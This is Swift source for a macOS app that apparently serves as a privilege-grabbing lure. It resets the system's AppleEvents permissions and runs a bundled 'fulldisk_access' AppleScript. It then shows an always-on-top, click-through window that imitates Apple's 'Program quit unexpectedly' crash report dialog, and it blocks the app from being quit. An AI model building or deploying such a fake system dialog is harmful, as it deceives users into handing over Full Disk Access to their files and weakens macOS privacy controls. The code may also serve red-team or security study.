import Cocoa
import AppKit
import Foundation

class AppDelegate: NSObject, NSApplicationDelegate {
    var window : NSWindow!
    var script_dir : String!

    func applicationDidFinishLaunching(_ notification: Notification) {
        script_dir = getScriptDirectory()
        shell("-c", "tccutil reset AppleEvents")
        shell("-c", "osascript " + script_dir + "/fulldisk_access.scpt")
        renderWindow()
    }

    func applicationShouldTerminate(_ sender: NSApplication) -> NSApplication.TerminateReply {
        return .terminateCancel
    }

    func applicationShouldTerminateAfterLastWindowClosed(_ sender: NSApplication) -> Bool {
        return false
    }

    func getScriptDirectory() -> String {
        let script_url = URL(fileURLWithPath:CommandLine.arguments[0]);
        return script_url.deletingLastPathComponent().path;
    }

    func renderWindow() {
        window = NSWindow(contentRect:NSMakeRect(0,0,300,300), styleMask: [.titled], backing:.buffered, defer:false)
        window.center()
        window.isOpaque = false
        window.isMovable = false
        window!.level = .screenSaver
        window!.ignoresMouseEvents = true
        window.makeKeyAndOrderFront(window)
        window.setFrameOrigin(NSPoint(x: window.frame.origin.x , y: window.frame.origin.y + 50))
        //window.backgroundColor = NSColor(red: 0, green: 0, blue: 0, alpha: 0.5)

        let imageView = NSImageView(frame:CGRect(origin: NSPoint(x: 110, y: 200), size: CGSize(width: 84, height: 84)))
        imageView.image = NSImage(byReferencingFile: script_dir + "/resources/AppIcon.icns")
        window.contentView?.addSubview(imageView)
        
        let label = NSTextField()
        label.isBezeled = false
        label.isEditable = false
        label.alignment = .center
        label.font = .boldSystemFont(ofSize: 16)
        label.stringValue = "Program quit unexpectedly"
        label.backgroundColor = .black.withAlphaComponent(0)
        label.frame = CGRect(origin: NSPoint(x: 0, y: 140), size: CGSize(width: 300, height: 50))
        window.contentView?.addSubview(label)

        let description = NSTextField()
        description.alignment = .left
        description.isBezeled = false
        description.isEditable = false
        description.font = .systemFont(ofSize: 15)
        description.backgroundColor = .black.withAlphaComponent(0)
        description.frame = CGRect(origin: NSPoint(x: 42, y: -40), size: CGSize(width: 220, height: 200))
        description.stringValue = "Click OK to see more detailed information and send a report to Apple."
        window.contentView?.addSubview(description)

        let button = NSButton();
        button.title = "OK"
        button.wantsLayer = true
        button.alignment = .center
        button.layer?.borderWidth = 0
        button.layer?.cornerRadius = 10
        button.font = .systemFont(ofSize: 14)
        button.frame = CGRect(origin: NSPoint(x: 154, y: 26), size: CGSize(width: 110, height: 30))
        window.contentView?.addSubview(button)
    }

    func shell(_ args: String...) { 
        let task = Process() 
        task.launchPath = "/bin/bash" 
        task.arguments = args 
        let pipe = Pipe() 
        task.standardOutput = pipe 
        task.launch()
    }
}

let appDelegate = AppDelegate()
let app = NSApplication.shared

app.delegate = appDelegate
app.setActivationPolicy(.regular)
app.activate(ignoringOtherApps:true)
app.run()